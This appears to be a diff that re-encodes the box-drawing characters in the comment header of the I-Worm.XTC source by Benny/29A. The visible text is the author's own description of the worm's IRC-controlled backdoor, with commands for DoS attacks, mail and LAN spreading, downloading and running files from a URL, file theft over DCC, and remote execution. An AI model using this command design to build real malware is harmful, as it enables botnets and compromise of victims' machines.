@@ -1,12 +1,12 @@
 
 COMMENT#
 
-                       	�����������������������������Ŀ
-                       	�  Project XTC - I-Worm.XTC   �
-                       	�������������������������������
-	                    ��������������������Ŀ
-        	            �    by Benny/29A    �
-                	    ����������������������
+                       	ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                       	³  Project XTC - I-Worm.XTC   ³
+                       	ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+	                    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+        	            ³    by Benny/29A    ³
+                	    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
 
 
 
@@ -55,71 +55,71 @@ NOTE:	Worm always replies to private window. Commandz written in private
 	public window will be executed by all wormz.
 
 
-�����������������������������������������������������������������������������Ŀ
-�             �                                                               �
-� Command     � Description                                                   �
-�             �                                                               �
-�����������������������������������������������������������������������������Ĵ
-� password    � logs on to worm                                               �
-�����������������������������������������������������������������������������Ĵ
-� nopassword  � logs off from worm                                            �
-�����������������������������������������������������������������������������Ĵ
-� dos         � starts with DOS attack                                        �
-�����������������������������������������������������������������������������Ĵ
-� stopdos     � stops the DOS attack                                          �
-�����������������������������������������������������������������������������Ĵ
-� spreadon    � starts with mail spreading                                    �
-�����������������������������������������������������������������������������Ĵ
-� spreadoff   � stops the mail spreading                                      �
-�����������������������������������������������������������������������������Ĵ
-� spreadto    � sends itself to specified e-mail address                      �
-�����������������������������������������������������������������������������Ĵ
-� lanspread   � starts with LAN spreading                                     �
-�����������������������������������������������������������������������������Ĵ
-� reconnect   � terminates itself and executes itself again                   �
-�����������������������������������������������������������������������������Ĵ
-� exitprocess � terminates itself                                             �
-�����������������������������������������������������������������������������Ĵ
-� reboot      � reboots computer                                              �
-�����������������������������������������������������������������������������Ĵ
-� leave       � cleans up and delete itself from infected computer            �
-�����������������������������������������������������������������������������Ĵ
-� update      � downloads file from specified URL and executes it             �
-�����������������������������������������������������������������������������Ĵ
-� ircsend     � runs the specified IRC command                                �
-�����������������������������������������������������������������������������Ĵ
-� mark        � payload, sets some default pagez of MSIE to                   �
-�             � http://www.therainforestsite.com                              �
-�����������������������������������������������������������������������������Ĵ
-� whois       � replies if infected computer has the same IP as the specified �
-�             � one                                                           �
-�����������������������������������������������������������������������������Ĵ
-� machine     � retrieves the name of infected computer                       �
-�����������������������������������������������������������������������������Ĵ
-� info        � retrives some informationz about itself                       �
-�����������������������������������������������������������������������������Ĵ
-� sendme      � sends specified file to user via DCC                          �
-�����������������������������������������������������������������������������Ĵ
-� 1, DCC SEND � accepts specified file via DCC                                �
-�����������������������������������������������������������������������������Ĵ
-� pwd         � retrieves current directory                                   �
-�����������������������������������������������������������������������������Ĵ
-� cd          � changes current directory                                     �
-�����������������������������������������������������������������������������Ĵ
-� md          � creates new directory                                         �
-�����������������������������������������������������������������������������Ĵ
-� rd          � removes specified directory                                   �
-�����������������������������������������������������������������������������Ĵ
-� dir         � lists all filenamez which match specified mask                �
-�����������������������������������������������������������������������������Ĵ
-� del         � removes specified file                                        �
-�����������������������������������������������������������������������������Ĵ
-� move        � moves/renames specified file                                  �
-�����������������������������������������������������������������������������Ĵ
-� copy        � copies specified file                                         �
-�����������������������������������������������������������������������������Ĵ
-� exec        � executes specified program                                    �
-�������������������������������������������������������������������������������
+ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+³             ³                                                               ³
+³ Command     ³ Description                                                   ³
+³             ³                                                               ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ password    ³ logs on to worm                                               ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ nopassword  ³ logs off from worm                                            ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ dos         ³ starts with DOS attack                                        ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ stopdos     ³ stops the DOS attack                                          ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ spreadon    ³ starts with mail spreading                                    ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ spreadoff   ³ stops the mail spreading                                      ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ spreadto    ³ sends itself to specified e-mail address                      ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ lanspread   ³ starts with LAN spreading                                     ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ reconnect   ³ terminates itself and executes itself again                   ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ exitprocess ³ terminates itself                                             ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ reboot      ³ reboots computer                                              ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ leave       ³ cleans up and delete itself from infected computer            ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ update      ³ downloads file from specified URL and executes it             ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ ircsend     ³ runs the specified IRC command                                ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ mark        ³ payload, sets some default pagez of MSIE to                   ³
+³             ³ http://www.therainforestsite.com                              ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ whois       ³ replies if infected computer has the same IP as the specified ³
+³             ³ one                                                           ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ machine     ³ retrieves the name of infected computer                       ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ info        ³ retrives some informationz about itself                       ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ sendme      ³ sends specified file to user via DCC                          ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ 1, DCC SEND ³ accepts specified file via DCC                                ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ pwd         ³ retrieves current directory                                   ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ cd          ³ changes current directory                                     ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ md          ³ creates new directory                                         ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ rd          ³ removes specified directory                                   ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ dir         ³ lists all filenamez which match specified mask                ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ del         ³ removes specified file                                        ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ move        ³ moves/renames specified file                                  ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ copy        ³ copies specified file                                         ³
+ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
+³ exec        ³ executes specified program                                    ³
+ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
 
 
 Everytime after IRC connection is established the worm sends to public window
@@ -131,9 +131,9 @@ I think longer description is not needed, the code speaks by itself. If you
 have any questionz, feel free to mail me... Have a fun!
 
 
-��������Ŀ
-� Greetz �
-����������
+ÚÄÄÄÄÄÄÄÄ¿
+³ Greetz ³
+ÀÄÄÄÄÄÄÄÄÙ
 
 Ratter:		I'm not angry, I just hate if someone stealz my code/ideaz
 		without asking. That's all... Try to realise your own ideaz.
@@ -143,11 +143,11 @@ Kaspersky:	I really wonder if you will spend more than 1 minute with
 
 
 
-                                                  �������������Ŀ
-                                                  � Benny / 29A �����������Ŀ
-                                                  @ benny_29a@privacyx.com  �
-                                                  @ http://benny29a.cjb.net �
-                                                  ���������������������������
+                                                  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+                                                  ³ Benny / 29A ÀÄÄÄÄÄÄÄÄÄÄÄ¿
+                                                  @ benny_29a@privacyx.com  ³
+                                                  @ http://benny29a.cjb.net ³
+                                                  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
 #
 
 
